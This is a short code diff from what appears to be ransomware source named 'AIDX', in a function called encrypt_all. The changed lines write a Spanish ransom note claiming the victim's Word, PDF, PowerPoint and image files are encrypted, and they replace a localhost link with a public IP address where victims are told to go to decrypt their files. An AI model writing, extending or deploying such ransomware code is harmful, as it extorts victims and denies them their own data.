@@ -132,8 +132,8 @@ def encrypt_all(application_path):
 
         file.write(' AIDX RANSONWARE   - ENCRIPTE TUS ARCHIVOS \n')
         file.write(' DOCUMENTOS WORD -  ARCHIVOS PDF -  POWER POINT  - JPG  -  PNG \n\n')
-        file.write('DESENCRIPTA TUS ARCHIVOS Y ELIMINA AIDX DE TU EQUIPO INGRESA AL SIGUIENTE LINK: \n  http://localhost/aidxhtml/aidx.html  ')
-        file.write(' ')
+        file.write('DESENCRIPTA TUS ARCHIVOS Y ELIMINA AIDX DE TU EQUIPO INGRESA AL SIGUIENTE LINK: \n  http://3.209.34.159/aidxweb/aidx.html  y pincha el boton azul ')
+        file.write('  ')
     print("Archivos encriptados correctamente.")
     print("Archivo TXT escrito con éxito.")
 
